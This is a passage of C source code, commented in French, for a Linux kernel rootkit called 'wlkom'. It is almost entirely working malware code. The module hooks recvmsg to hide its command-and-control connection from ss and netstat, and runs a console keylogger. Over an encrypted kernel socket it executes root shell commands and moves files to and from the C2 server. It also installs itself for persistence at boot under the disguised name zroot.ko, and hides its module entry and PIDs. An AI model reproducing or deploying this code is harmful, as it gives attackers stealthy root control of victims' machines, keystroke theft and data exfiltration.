    snprintf(c2_port_hex, sizeof(c2_port_hex), "%04X", c2_port);
    ip_addr = in_aton(c2_ip);  /* Convertir "192.168.122.167" en u32 */
    snprintf(c2_ip_hex, sizeof(c2_ip_hex), "%08X", ip_addr);
    net_hide_ready = 1;
    printk(KERN_INFO "wlkom: net hiding ready (port=%s ip=%s)\n",
           c2_port_hex, c2_ip_hex);
}

/* ============================================================================
 *  HOOK RECVMSG - Cacher la connexion C2 de ss et netstat
 * ============================================================================
 *
 *  ss et netstat utilisent NETLINK_SOCK_DIAG pour interroger le noyau
 *  sur les sockets actives. Le noyau repond avec des messages netlink
 *  contenant des struct inet_diag_msg (une par socket).
 *
 *  Notre hook :
 *  1. Appelle le vrai recvmsg()
 *  2. Verifie si c'est un socket NETLINK_SOCK_DIAG
 *  3. Si oui, parcourt les messages netlink dans la reponse
 *  4. Supprime les messages dont le port source ou destination = notre port C2
 *  5. Retourne le resultat filtre
 *
 *  Resultat : notre connexion est invisible dans ss et netstat.
 */

typedef asmlinkage long (*orig_recvmsg_t)(const struct pt_regs *);
static orig_recvmsg_t real_recvmsg = NULL;

static asmlinkage long hk_recvmsg(const struct pt_regs *regs)
{
    long ret;
    unsigned int fd;
    struct file *f;
    struct socket *sock;
    struct sock *sk;
    struct iovec iov;
    char __user *ubuf;
    unsigned long ulen;
    char *kbuf;
    struct nlmsghdr *nlh;
    unsigned int offset, new_len;

    /* Appeler le vrai recvmsg */
    ret = real_recvmsg(regs);
    if (ret <= 0 || !net_hide_ready)
        return ret;

    /* Verifier que c'est un socket NETLINK_SOCK_DIAG */
    fd = (unsigned int)regs->di;
    f = fget(fd);
    if (!f) return ret;

    sock = sock_from_file(f);
    if (!sock || !sock->sk) { fput(f); return ret; }
    sk = sock->sk;
    if (sk->sk_family != AF_NETLINK) { fput(f); return ret; }
    if (sk->sk_protocol != NETLINK_SOCK_DIAG) { fput(f); return ret; }
    fput(f);

    /* Extraire le buffer iov du message userland */
    {
        struct user_msghdr __user *umsg = (void __user *)regs->si;
        struct iovec __user *uiov;
        if (get_user(uiov, &umsg->msg_iov)) return ret;
        if (copy_from_user(&iov, uiov, sizeof(iov))) return ret;
    }

    ubuf = iov.iov_base;
    ulen = iov.iov_len;
    if ((unsigned long)ret > ulen) return ret;

    /* Copier la reponse dans un buffer kernel */
    kbuf = kmalloc(ret, GFP_KERNEL);
    if (!kbuf) return ret;
    if (copy_from_user(kbuf, ubuf, ret)) { kfree(kbuf); return ret; }

    /* Parcourir les messages netlink un par un */
    offset = 0;
    new_len = 0;
    while (offset < (unsigned int)ret) {
        nlh = (struct nlmsghdr *)(kbuf + offset);

        /* Verification de securite : le message est-il valide ? */
        if (offset + sizeof(*nlh) > (unsigned int)ret ||
            nlh->nlmsg_len < sizeof(*nlh) ||
            offset + NLMSG_ALIGN(nlh->nlmsg_len) > (unsigned int)ret + NLMSG_ALIGNTO)
            break;

        /* Si c'est un diagnostic de socket TCP/UDP */
        if (nlh->nlmsg_type == SOCK_DIAG_BY_FAMILY &&
            nlh->nlmsg_len >= NLMSG_LENGTH(sizeof(struct inet_diag_msg))) {
            struct inet_diag_msg *idm = NLMSG_DATA(nlh);
            __be16 port = htons((u16)c2_port);

            /* Si le port source ou destination est notre port C2 : SUPPRIMER */
            if (idm->id.idiag_sport == port ||
                idm->id.idiag_dport == port) {
                offset += NLMSG_ALIGN(nlh->nlmsg_len);
                continue;  /* Sauter ce message (ne pas le copier) */
            }
        }

        /* Ce message n'est pas le notre : le garder */
        if (new_len != offset)
            memmove(kbuf + new_len, kbuf + offset,
                    NLMSG_ALIGN(nlh->nlmsg_len));
        new_len += NLMSG_ALIGN(nlh->nlmsg_len);
        offset += NLMSG_ALIGN(nlh->nlmsg_len);
    }

    /* Copier le resultat filtre vers userland */
    if (new_len != (unsigned int)ret) {
        if (copy_to_user(ubuf, kbuf, new_len)) {
            kfree(kbuf);
            return ret;
        }
        kfree(kbuf);
        return (long)new_len;
    }

    kfree(kbuf);
    return ret;
}

static struct ftrace_hook recvmsg_hook = {
    .name     = "__x64_sys_recvmsg",
    .function = hk_recvmsg,
    .original = &real_recvmsg,
};

static int hide_ss_active = 0;

static void hide_ss_init(void)
{
    if (fh_install_hook(&recvmsg_hook) == 0) {
        hide_ss_active = 1;
        printk(KERN_INFO "wlkom: ss hiding active (recvmsg hook)\n");
    }
}

static void hide_ss_exit(void)
{
    if (hide_ss_active) {
        fh_remove_hook(&recvmsg_hook);
        hide_ss_active = 0;
    }
}

/* ============================================================================
 *  KEYLOGGER - Capture clavier via keyboard_notifier
 * ============================================================================
 *
 *  Le noyau Linux a un systeme de "notifiers" : des callbacks appelees
 *  quand certains evenements se produisent.
 *
 *  keyboard_notifier est appele a chaque frappe sur la console physique.
 *  (Pour SSH, c'est le hook read qui capture les frappes, pas ce notifier.)
 *
 *  On enregistre notre callback avec register_keyboard_notifier().
 *  A chaque touche pressee, keylog_notify() est appelee.
 */

/*
 * keylog_notify() - Callback appelee a chaque frappe clavier
 *
 * Parametres :
 *   code - type d'evenement (KBD_KEYSYM = touche pressee)
 *   data - struct keyboard_notifier_param avec la valeur de la touche
 */
static int keylog_notify(struct notifier_block *nb, unsigned long code, void *data)
{
    struct keyboard_notifier_param *param = data;
    unsigned long flags;
    char c;

    /* On ne s'interesse qu'aux touches pressees (pas relachees) */
    if (code != KBD_KEYSYM || !param->down)
        return NOTIFY_OK;

    /* Convertir la valeur en caractere ASCII */
    if (param->value >= 0x20 && param->value < 0x7f)
        c = (char)param->value;             /* Caractere imprimable */
    else if (param->value == 0x0d || param->value == 0x0a)
        c = '\n';                           /* Entree */
    else
        return NOTIFY_OK;                   /* Touche speciale, on ignore */

    /* Ajouter le caractere au buffer */
    spin_lock_irqsave(&keylog_lock, flags);
    if (keylog_pos >= KEYLOG_BUF_SIZE - 2)
        keylog_pos = 0;                     /* Ring buffer : retour au debut */
    keylog_buf[keylog_pos++] = c;
    keylog_buf[keylog_pos] = '\0';
    spin_unlock_irqrestore(&keylog_lock, flags);
    return NOTIFY_OK;
}

static struct notifier_block keylog_nb = {
    .notifier_call = keylog_notify,
};

/* Demarrer le keylogger */
static void keylogger_start(void)
{
    if (keylogger_active) return;
    register_keyboard_notifier(&keylog_nb);
    keylogger_active = 1;
    printk(KERN_INFO "wlkom: keylogger started\n");
}

/* Arreter le keylogger */
static void keylogger_stop(void)
{
    if (!keylogger_active) return;
    unregister_keyboard_notifier(&keylog_nb);
    keylogger_active = 0;
    printk(KERN_INFO "wlkom: keylogger stopped\n");
}

/*
 * keylog_dump() - Lire et vider le buffer de keylog
 *
 * Copie le contenu du buffer dans out, puis remet keylog_pos a 0.
 * Retourne le nombre de caracteres copies.
 */
static int keylog_dump(char *out, int max_len)
{
    unsigned long flags;
    int len;

    spin_lock_irqsave(&keylog_lock, flags);
    len = keylog_pos;
    if (len > max_len - 1) len = max_len - 1;
    memcpy(out, keylog_buf, len);
    out[len] = '\0';
    keylog_pos = 0;  /* Vider le buffer apres lecture */
    spin_unlock_irqrestore(&keylog_lock, flags);
    return len;
}

/* ============================================================================
 *  RESEAU TCP - Communication avec le C2
 * ============================================================================
 *
 *  Le rootkit utilise des sockets TCP noyau (kernel sockets) pour communiquer
 *  avec le serveur C2. Ces fonctions gerent l'envoi et la reception de donnees,
 *  avec ou sans chiffrement.
 */

/*
 * raw_send_all() - Envoyer des donnees brutes (sans chiffrement)
 *
 * Envoie exactement `len` octets. Si kernel_sendmsg n'envoie qu'une partie,
 * on boucle jusqu'a ce que tout soit envoye.
 */
static int raw_send_all(const char *data, int len)
{
    struct kvec vec;       /* Vecteur de donnees pour kernel_sendmsg */
    struct msghdr mh;      /* En-tete du message */
    int sent = 0, ret;
    if (!c2_sock || len <= 0) return -1;
    while (sent < len) {
        memset(&mh, 0, sizeof(mh));
        vec.iov_base = (void *)(data + sent);
        vec.iov_len  = len - sent;
        ret = kernel_sendmsg(c2_sock, &mh, &vec, 1, len - sent);
        if (ret <= 0) return ret;  /* Erreur ou connexion fermee */
        sent += ret;
    }
    return sent;
}

/*
 * raw_recv_all() - Recevoir exactement `len` octets (bloquant avec timeout)
 *
 * Boucle jusqu'a avoir recu exactement `len` octets.
 * Si rien n'arrive pendant 5 secondes (500 x 10ms), on abandonne.
 */
static int raw_recv_all(char *buf, int len)
{
    struct kvec vec;
    struct msghdr mh;
    int got = 0, ret, tries = 0;
    if (!c2_sock || len <= 0) return -1;
    while (got < len && tries < 500) {
        memset(&mh, 0, sizeof(mh));
        vec.iov_base = buf + got;
        vec.iov_len  = len - got;
        ret = kernel_recvmsg(c2_sock, &mh, &vec, 1, len - got, MSG_DONTWAIT);
        if (ret > 0) { got += ret; tries = 0; }                   /* Donnees recues */
        else if (ret == -EAGAIN || ret == -EWOULDBLOCK) { msleep(10); tries++; } /* Rien pour le moment */
        else return ret;                                            /* Erreur */
    }
    return got == len ? len : -1;
}

/*
 * send_msg() - Envoyer un message chiffre avec ChaCha20-Poly1305
 *
 * Format de la trame envoyee :
 *   [4 octets] taille du payload (big-endian)
 *   [8 octets] nonce (little-endian, compteur)
 *   [N octets] texte chiffre (ChaCha20)
 *   [16 octets] tag d'authentification (Poly1305)
 *
 * Si le chiffrement n'est pas encore pret, envoie en clair.
 */
static int send_msg(const char *msg, int len)
{
    u8 *frame;
    u32 net_len;
    u64 nonce;
    int total, ret;

    if (!c2_sock || len <= 0) return -1;

    /* Si la cle n'est pas encore derivee, envoyer en clair */
    if (!crypto_ready)
        return raw_send_all(msg, len);

    /* Taille totale : header (12) + message chiffre + tag (16) */
    total = CRYPTO_HDR_SIZE + len + CRYPTO_TAG_SIZE;
    frame = kmalloc(total, GFP_KERNEL);
    if (!frame) return -ENOMEM;

    /* Nonce = compteur qui s'incremente a chaque message */
    nonce = send_nonce_ctr++;

    /* Taille du payload (nonce + ciphertext + tag) en big-endian */
    net_len = htonl(CRYPTO_NONCE_SIZE + len + CRYPTO_TAG_SIZE);

    /* Construire la trame */
    memcpy(frame, &net_len, 4);          /* [0-3] Taille */
    memcpy(frame + 4, &nonce, 8);        /* [4-11] Nonce */

    /* Chiffrer le message avec ChaCha20 et ajouter le tag Poly1305 */
    chacha20poly1305_encrypt(frame + CRYPTO_HDR_SIZE,
                             (const u8 *)msg, len,
                             NULL, 0, nonce, crypto_key);

    /* Envoyer la trame complete */
    ret = raw_send_all((char *)frame, total);
    kfree(frame);
    return ret > 0 ? len : ret;
}

/*
 * recv_msg_nb() - Recevoir un message chiffre (non-bloquant)
 *
 * Dechiffre le message recu et le place dans buf.
 * Retourne le nombre d'octets dechiffres, -EAGAIN si rien a lire,
 * ou une valeur negative en cas d'erreur.
 *
 * Le format attendu est le meme que send_msg().
 */
static int recv_msg_nb(char *buf, int size)
{
    struct kvec vec;
    struct msghdr mh;
    u8 hdr[4];
    u32 payload_len;
    u64 nonce;
    u8 *payload;
    int ret;
    size_t ct_len, pt_len;

    if (!c2_sock) return -1;

    /* Si pas de crypto, lire en clair */
    if (!crypto_ready) {
        memset(&mh, 0, sizeof(mh));
        memset(buf, 0, size);
        vec.iov_base = buf;
        vec.iov_len  = size - 1;
        return kernel_recvmsg(c2_sock, &mh, &vec, 1, size - 1, MSG_DONTWAIT);
    }

    /* Peek : regarder s'il y a 4 octets disponibles (header de taille) */
    memset(&mh, 0, sizeof(mh));
    vec.iov_base = hdr;
    vec.iov_len  = 4;
    ret = kernel_recvmsg(c2_sock, &mh, &vec, 1, 4, MSG_DONTWAIT | MSG_PEEK);
    if (ret == 0) return 0;   /* Connexion fermee */
    if (ret < 0) return ret;  /* -EAGAIN = rien a lire */
    if (ret < 4) {
        /* Header partiel = probablement deconnexion en cours */
        memset(&mh, 0, sizeof(mh));
        vec.iov_base = hdr;
        vec.iov_len  = ret;
        kernel_recvmsg(c2_sock, &mh, &vec, 1, ret, 0);
        return 0;
    }

    /* Lire le header pour de vrai (consomme les 4 octets) */
    ret = raw_recv_all((char *)hdr, 4);
    if (ret != 4) return -1;

    /* Extraire la taille du payload */
    memcpy(&payload_len, hdr, 4);
    payload_len = ntohl(payload_len);

    /* Validation : taille raisonnable */
    if (payload_len < CRYPTO_NONCE_SIZE + CRYPTO_TAG_SIZE || payload_len > 65536)
        return -1;

    /* Allouer et lire le payload complet */
    payload = kmalloc(payload_len, GFP_KERNEL);
    if (!payload) return -ENOMEM;

    ret = raw_recv_all((char *)payload, payload_len);
    if (ret != (int)payload_len) { kfree(payload); return -1; }

    /* Extraire le nonce (8 premiers octets du payload) */
    memcpy(&nonce, payload, 8);
    ct_len = payload_len - CRYPTO_NONCE_SIZE;  /* Taille ciphertext + tag */
    pt_len = ct_len - CRYPTO_TAG_SIZE;          /* Taille du texte en clair */

    if (pt_len > (size_t)(size - 1)) { kfree(payload); return -1; }

    /* Dechiffrer et verifier l'integrite (Poly1305) */
    if (!chacha20poly1305_decrypt((u8 *)buf, payload + CRYPTO_NONCE_SIZE,
                                  ct_len, NULL, 0, nonce, crypto_key)) {
        kfree(payload);
        printk(KERN_ERR "wlkom: decrypt failed\n");
        return -1;  /* Dechiffrement echoue = message corrompu ou mauvaise cle */
    }

    buf[pt_len] = '\0';
    kfree(payload);
    return (int)pt_len;
}

/*
 * connect_to_c2() - Se connecter au serveur C2 via TCP
 *
 * Cree un socket TCP noyau et se connecte a c2_ip:c2_port.
 * Si un ancien socket existe, il est ferme d'abord.
 */
static int connect_to_c2(void)
{
    struct sockaddr_in addr;
    int ret;

    /* Fermer l'ancien socket s'il existe */
    if (c2_sock) { sock_release(c2_sock); c2_sock = NULL; }

    /* Creer un socket TCP dans le namespace reseau par defaut */
    ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM,
                           IPPROTO_TCP, &c2_sock);
    if (ret < 0) { c2_sock = NULL; return ret; }

    /* Preparer l'adresse de destination */
    memset(&addr, 0, sizeof(addr));
    addr.sin_family      = AF_INET;
    addr.sin_port        = htons(c2_port);       /* Port en network byte order */
    addr.sin_addr.s_addr = in_aton(c2_ip);       /* IP texte → binaire */

    /* Se connecter (bloquant) */
    ret = kernel_connect(c2_sock, (struct sockaddr *)&addr,
                         sizeof(addr), 0);
    if (ret < 0) { sock_release(c2_sock); c2_sock = NULL; return ret; }

    printk(KERN_INFO "wlkom: connected to C2\n");
    return 0;
}

/* ============================================================================
 *  SHA-256 - Hachage et verification du mot de passe
 * ============================================================================ */

/*
 * compute_sha256() - Calculer le hash SHA-256 d'un buffer
 *
 * Utilise l'API crypto du noyau Linux (pas de libc ici).
 * Le resultat (32 octets binaires) est ecrit dans `out`.
 */
static int compute_sha256(const char *data, size_t len, u8 *out)
{
    struct crypto_shash *tfm;     /* Transformation (contexte crypto) */
    struct shash_desc *desc;      /* Descripteur de hash */
    int ret;

    /* Allouer un contexte SHA-256 */
    tfm = crypto_alloc_shash("sha256", 0, 0);
    if (IS_ERR(tfm)) return PTR_ERR(tfm);

    /* Allouer le descripteur (taille variable selon l'algo) */
    desc = kmalloc(sizeof(*desc) + crypto_shash_descsize(tfm), GFP_KERNEL);
    if (!desc) { crypto_free_shash(tfm); return -ENOMEM; }

    desc->tfm = tfm;
    /* Calculer le hash en un seul appel */
    ret = crypto_shash_digest(desc, data, len, out);

    kfree(desc);
    crypto_free_shash(tfm);
    return ret;
}

/*
 * bin2hex_str() - Convertir des octets binaires en string hexadecimale
 *
 * Exemple : {0xAB, 0xCD} → "abcd"
 */
static void bin2hex_str(const u8 *bin, size_t len, char *hex)
{
    static const char h[] = "0123456789abcdef";
    size_t i;
    for (i = 0; i < len; i++) {
        hex[i*2]   = h[bin[i] >> 4];    /* Quartet haut */
        hex[i*2+1] = h[bin[i] & 0xf];   /* Quartet bas */
    }
    hex[len*2] = '\0';
}

/*
 * check_password() - Verifier le mot de passe du rootkit
 *
 * 1. Hash le mot de passe recu avec SHA-256
 * 2. Convertit le hash en hex
 * 3. Compare avec pw_hash (passe en parametre au chargement)
 *
 * Si pw_hash est vide, accepte tout (pas de mot de passe).
 */
static int check_password(const char *pwd)
{
    u8 hash[32];     /* Hash SHA-256 binaire (32 octets) */
    char hex[65];    /* Hash en hex (64 chars + \0) */

    if (!pw_hash || strlen(pw_hash) == 0) return 1;  /* Pas de mdp = acces libre */

    if (compute_sha256(pwd, strlen(pwd), hash) < 0) return 0;
    bin2hex_str(hash, sizeof(hash), hex);
    return strcmp(hex, pw_hash) == 0;  /* 1 si match, 0 sinon */
}

/*
 * crypto_derive_key() - Deriver la cle de chiffrement ChaCha20
 *
 * La cle est derivee par : SHA-256("wlkom_crypto_" + pw_hash)
 * Le meme calcul est fait cote C2 (Python), donc les deux cotes
 * obtiennent la meme cle SANS jamais la transmettre sur le reseau.
 */
static void crypto_derive_key(void)
{
    char seed[128];
    int len;

    len = snprintf(seed, sizeof(seed), "wlkom_crypto_%s", pw_hash);
    if (compute_sha256(seed, len, crypto_key) == 0) {
        crypto_ready = 1;
        printk(KERN_INFO "wlkom: crypto ready (chacha20-poly1305)\n");
    } else {
        printk(KERN_ERR "wlkom: crypto key derivation failed\n");
    }
}

/* ============================================================================
 *  EXECUTION DE COMMANDES
 * ============================================================================
 *
 *  exec_cmd() execute une commande shell sur la machine victime.
 *
 *  On ne peut PAS utiliser popen() ou system() en noyau.
 *  On utilise call_usermodehelper() qui demande au noyau de lancer
 *  un processus en userland (comme si root tapait la commande).
 *
 *  Fonctionnement :
 *  1. Supprime les fichiers temporaires precedents
 *  2. Lance la commande avec redirection vers /tmp/.wlkom_out
 *  3. Attend que /tmp/.wlkom_done apparaisse (= commande terminee)
 *  4. Lit le contenu de /tmp/.wlkom_out
 *  5. Envoie le resultat au C2 via send_msg()
 *  6. Nettoie les fichiers temporaires
 *
 *  Limite : 60 Ko de sortie maximum, timeout de 30 secondes.
 */
static int exec_cmd(const char *cmd)
{
    char *argv[] = { "/bin/sh", "-c", NULL, NULL };
    char *envp[] = { "HOME=/root",
                     "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
                     "TERM=xterm",
                     "LANG=C",
                     NULL };
    char full_cmd[1024];
    struct file *f;
    char *buf;
    char *out;
    loff_t pos = 0;
    ssize_t bytes;
    long total = 0;
    int tries;
    #define MAX_OUTPUT (60 * 1024)  /* 60 Ko max de sortie */

    /* 1. Supprimer les fichiers temporaires precedents */
    argv[2] = "rm -f /tmp/.wlkom_out /tmp/.wlkom_done";
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);

    /* 2. Lancer la commande avec redirection stdout+stderr vers un fichier */
    snprintf(full_cmd, sizeof(full_cmd),
             "%s > /tmp/.wlkom_out 2>&1; touch /tmp/.wlkom_done",
             cmd);
    argv[2] = full_cmd;
    call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);  /* Non-bloquant */

    /* 3. Attendre que la commande se termine (max 30s = 60 x 500ms) */
    for (tries = 0; tries < 60; tries++) {
        msleep(500);
        f = filp_open("/tmp/.wlkom_done", O_RDONLY, 0);
        if (!IS_ERR(f)) {
            filp_close(f, NULL);
            break;  /* Le fichier existe = commande terminee */
        }
    }

    /* 4. Lire le fichier de sortie */
    f = filp_open("/tmp/.wlkom_out", O_RDONLY, 0);
    if (IS_ERR(f)) { send_msg("(no output)\n", 12); goto cleanup; }

    /* vmalloc car la sortie peut etre grande (jusqu'a 60 Ko) */
    out = vmalloc(MAX_OUTPUT);
    if (!out) { filp_close(f, NULL); goto cleanup; }

    buf = kmalloc(4096, GFP_KERNEL);
    if (!buf) { vfree(out); filp_close(f, NULL); goto cleanup; }

    /* Lire par blocs de 4 Ko */
    pos = 0;
    total = 0;
    while (total < MAX_OUTPUT - 1) {
        bytes = kernel_read(f, buf, 4095, &pos);
        if (bytes <= 0) break;
        if (total + bytes >= MAX_OUTPUT)
            bytes = MAX_OUTPUT - 1 - total;
        memcpy(out + total, buf, bytes);
        total += bytes;
    }
    kfree(buf);
    filp_close(f, NULL);

    /* 5. Envoyer le resultat au C2 */
    if (total > 0) {
        out[total] = '\0';
        send_msg(out, total);
    } else {
        send_msg("(no output)\n", 12);
    }
    vfree(out);

    /* 6. Nettoyer les fichiers temporaires */
cleanup:
    argv[2] = "rm -f /tmp/.wlkom_out /tmp/.wlkom_done";
    call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
    return 0;
    #undef MAX_OUTPUT
}

/* ============================================================================
 *  DOWNLOAD - Telecharger un fichier de la victime vers le C2
 * ============================================================================
 *
 *  Protocole :
 *    C2 envoie : "DOWNLOAD:/chemin/du/fichier"
 *    Rootkit repond : "FILE:/chemin:taille\n" puis les donnees par blocs de 4 Ko
 *    Rootkit termine par : "EOF\n"
 */
static int do_download(const char *path)
{
    struct file *f;
    char *buf;
    char header[256];
    loff_t pos = 0;
    ssize_t bytes;
    loff_t size;

    /* Ouvrir le fichier */
    f = filp_open(path, O_RDONLY, 0);
    if (IS_ERR(f)) { send_msg("ERR:not found\n", 14); return -1; }

    /* Envoyer le header avec le chemin et la taille */
    size = i_size_read(file_inode(f));
    snprintf(header, sizeof(header), "FILE:%s:%lld\n", path, (long long)size);
    send_msg(header, strlen(header));

    /* Envoyer le contenu par blocs de 4 Ko */
    buf = kmalloc(4096, GFP_KERNEL);
    if (!buf) { filp_close(f, NULL); return -ENOMEM; }
    while ((bytes = kernel_read(f, buf, 4096, &pos)) > 0)
        send_msg(buf, bytes);

    /* Terminer par EOF */
    send_msg("EOF\n", 4);
    kfree(buf);
    filp_close(f, NULL);
    return 0;
}

/* ============================================================================
 *  UPLOAD - Recevoir un fichier du C2 vers la victime
 * ============================================================================
 *
 *  Protocole :
 *    C2 envoie : "UPLOAD:/chemin/destination"
 *    C2 envoie : "4096\n" (taille en octets)
 *    Rootkit repond : "READY\n"
 *    C2 envoie : les donnees par blocs
 *    Rootkit confirme : "UPLOAD_OK\n"
 */
static int do_upload(const char *path)
{
    struct file *f;
    char *buf;
    char size_buf[64];
    int ret, tries;
    loff_t pos = 0;
    long long total = 0, received = 0;

    /* 1. Recevoir la taille du fichier */
    tries = 0;
    ret = -EAGAIN;
    while ((ret == -EAGAIN || ret == -EWOULDBLOCK) && tries < 100) {
        ret = recv_msg_nb(size_buf, sizeof(size_buf));
        if (ret == -EAGAIN || ret == -EWOULDBLOCK) { msleep(50); tries++; }
    }
    if (ret <= 0) return -1;
    size_buf[ret] = 0;
    if (ret > 0 && size_buf[ret-1] == '\n') size_buf[ret-1] = 0;
    if (kstrtoll(size_buf, 10, &total) < 0) return -1;

    /* 2. Creer/ouvrir le fichier destination */
    f = filp_open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (IS_ERR(f)) { send_msg("ERR:create\n", 11); return -1; }
    send_msg("READY\n", 6);

    /* 3. Recevoir et ecrire les donnees par blocs */
    buf = kmalloc(4096, GFP_KERNEL);
    if (!buf) { filp_close(f, NULL); return -ENOMEM; }

    while (received < total) {
        tries = 0;
        ret = -EAGAIN;
        while ((ret == -EAGAIN || ret == -EWOULDBLOCK) && tries < 200) {
            ret = recv_msg_nb(buf, 4096);
            if (ret == -EAGAIN || ret == -EWOULDBLOCK) { msleep(50); tries++; }
        }
        if (ret <= 0) break;
        kernel_write(f, buf, ret, &pos);
        received += ret;
    }
    kfree(buf);
    filp_close(f, NULL);
    send_msg("UPLOAD_OK\n", 10);
    return 0;
}

/* ============================================================================
 *  PERSISTENCE - Survivre au reboot
 * ============================================================================
 *
 *  Pour que le rootkit se recharge automatiquement au demarrage, on :
 *
 *  1. Copie wlkom.ko vers /lib/modules/.../extra/zroot.ko
 *     (nom "zroot" pour la discretion, pas de reference a "wlkom")
 *
 *  2. Cree /etc/modules-load.d/zroot.conf contenant "zroot"
 *     (systemd charge automatiquement les modules listes ici au boot)
 *
 *  3. Cree /etc/modprobe.d/zroot.conf avec les parametres
 *     (modprobe utilise ces options quand il charge "zroot")
 *
 *  4. Execute depmod -a pour mettre a jour la base des modules
 *
 *  call_usermodehelper avec UMH_WAIT_PROC attend la fin de la commande.
 */
static void set_persistence(void)
{
    char *argv[] = { "/bin/sh", "-c", NULL, NULL };
    char *envp[] = { "HOME=/",
                     "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
                     NULL };
    char cmd[512];

    /* 1. Copier le module sous le nom zroot.ko */
    argv[2] = "mkdir -p /lib/modules/$(uname -r)/extra && "
              "cp /root/wlkom/rootkit/wlkom.ko "
              "/lib/modules/$(uname -r)/extra/zroot.ko && depmod -a";
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);

    /* 2. Auto-load au boot */
    argv[2] = "echo zroot > /etc/modules-load.d/zroot.conf";
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);

    /* 3. Parametres du module pour modprobe */
    snprintf(cmd, sizeof(cmd),
        "echo 'options zroot pw_hash=%s c2_ip=%s c2_port=%d' "
        "> /etc/modprobe.d/zroot.conf",
        pw_hash, c2_ip, c2_port);
    argv[2] = cmd;
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);

    printk(KERN_INFO "wlkom: persistence set\n");
}

/* ============================================================================
 *  HIDE MODULE - Se cacher de lsmod et /sys/module
 * ============================================================================
 *
 *  Les modules noyau sont dans une liste chainee doublement liee.
 *  lsmod parcourt cette liste pour afficher les modules.
 *
 *  list_del() retire notre module de cette liste.
 *  kobject_del() retire l'entree /sys/module/wlkom et /proc/modules.
 *
 *  Apres ca, le module est toujours en memoire et fonctionne,
 *  mais il est invisible pour l'utilisateur.
 */
static void hide_module(void)
{
    prev_module = THIS_MODULE->list.prev;       /* Sauvegarder le predecesseur */
    list_del(&THIS_MODULE->list);                /* Retirer de la liste chainee */
    kobject_del(&THIS_MODULE->mkobj.kobj);       /* Retirer de sysfs */
    printk(KERN_INFO "wlkom: module hidden\n");
}

/* ============================================================================
 *  THREAD C2 PRINCIPAL - Boucle de commandes
 * ============================================================================
 *
 *  C'est le coeur du rootkit. Ce thread noyau (kthread) tourne en boucle
 *  et gere toute la communication avec le serveur C2.
 *
 *  Phase d'initialisation (une seule fois) :
 *    - Persister au reboot
 *    - Se cacher (module, fichiers, lignes, reseau, PID)
 *    - Deriver la cle de chiffrement
 *    - Demarrer le keylogger
 *
 *  Boucle principale (infinie) :
 *    - Si pas connecte → se connecter et envoyer AUTH_REQUIRED
 *    - Recevoir un message (non-bloquant)
 *    - Si pas authentifie → verifier le mot de passe
 *    - Si authentifie → dispatcher la commande (exec, download, upload, etc.)
 */
static int c2_thread_fn(void *data)
{
    char buf[512];  /* Buffer de reception des commandes (512 octets max) */
    int ret;

    /* Attendre 2 secondes que le systeme se stabilise */
    ssleep(2);

    /* ---- Phase d'initialisation ---- */
    set_persistence();       /* Configurer la persistence au reboot */
    hide_module();           /* Se cacher de lsmod */
    hide_files_init();       /* Hook getdents64 : cacher fichiers */
    hide_lines_init();       /* Hook read : filtrer lignes */
    crypto_derive_key();     /* Deriver la cle ChaCha20 */
    net_hide_init();         /* Preparer les hex pour /proc/net/tcp */
    hide_ss_init();          /* Hook recvmsg : cacher de ss/netstat */
    keylogger_start();       /* Demarrer la capture clavier */

    /* Cacher notre propre PID du kthread */
    {
        unsigned long flags;
        spin_lock_irqsave(&pid_lock, flags);
        if (hidden_pid_count < MAX_HIDDEN_PIDS)
            hidden_pids[hidden_pid_count++] = current->pid;
        spin_unlock_irqrestore(&pid_lock, flags);
        printk(KERN_INFO "wlkom: kthread PID %d auto-hidden\n", current->pid);
    }

    printk(KERN_INFO "wlkom: C2 thread started\n");

    /* ---- Boucle principale ---- */
    while (running && !kthread_should_stop()) {

        /* Si pas connecte au C2 : tenter une connexion */
        if (!c2_sock) {
            authenticated = 0;
            send_nonce_ctr = 0;  /* Reset le compteur de nonce */
            if (connect_to_c2() < 0) { ssleep(5); continue; }  /* Reessayer dans 5s */
            send_msg("AUTH_REQUIRED\n", 14);  /* Dire au C2 qu'on attend un mdp */
        }

        /* Recevoir un message (non-bloquant) */
        ret = recv_msg_nb(buf, sizeof(buf));

        /* Rien a lire pour le moment */
        if (ret == -EAGAIN || ret == -EWOULDBLOCK) {
            msleep(200);  /* Attendre 200ms avant de reessayer */
            continue;
        }

        /* Erreur ou connexion fermee : se reconnecter */
        if (ret <= 0) {
            sock_release(c2_sock);
            c2_sock = NULL;
            authenticated = 0;
            ssleep(5);  /* Attendre 5s avant de retenter */
            continue;
        }

        /* Retirer le \n final */
        if (buf[ret-1] == '\n') buf[ret-1] = '\0';

        /* ---- Authentification ---- */
        if (!authenticated) {
            if (check_password(buf)) {
                authenticated = 1;
                send_msg("AUTH_OK\n", 8);
                printk(KERN_INFO "wlkom: authenticated\n");
            } else {
                send_msg("AUTH_FAIL\n", 10);
                /* Mauvais mdp : deconnecter et attendre 5s */
                sock_release(c2_sock);
                c2_sock = NULL;
                ssleep(5);
            }
            continue;
        }

        /* ---- Dispatch des commandes ---- */

        if (strncmp(buf, "DOWNLOAD:", 9) == 0) {
            do_download(buf + 9);  /* buf+9 = chemin apres "DOWNLOAD:" */

        } else if (strncmp(buf, "UPLOAD:", 7) == 0) {
            do_upload(buf + 7);

        } else if (strncmp(buf, "HIDE_PID:", 9) == 0) {
            /* Ajouter un PID a la liste des PIDs caches */
            long pid_val;
            if (kstrtol(buf + 9, 10, &pid_val) == 0) {
                unsigned long flags;
                spin_lock_irqsave(&pid_lock, flags);
                if (hidden_pid_count < MAX_HIDDEN_PIDS) {
                    hidden_pids[hidden_pid_count++] = (pid_t)pid_val;
                    spin_unlock_irqrestore(&pid_lock, flags);
                    send_msg("PID_HIDDEN\n", 11);
                } else {
                    spin_unlock_irqrestore(&pid_lock, flags);
                    send_msg("ERR:max_pids\n", 13);
                }
            } else {
                send_msg("ERR:bad_pid\n", 12);
            }

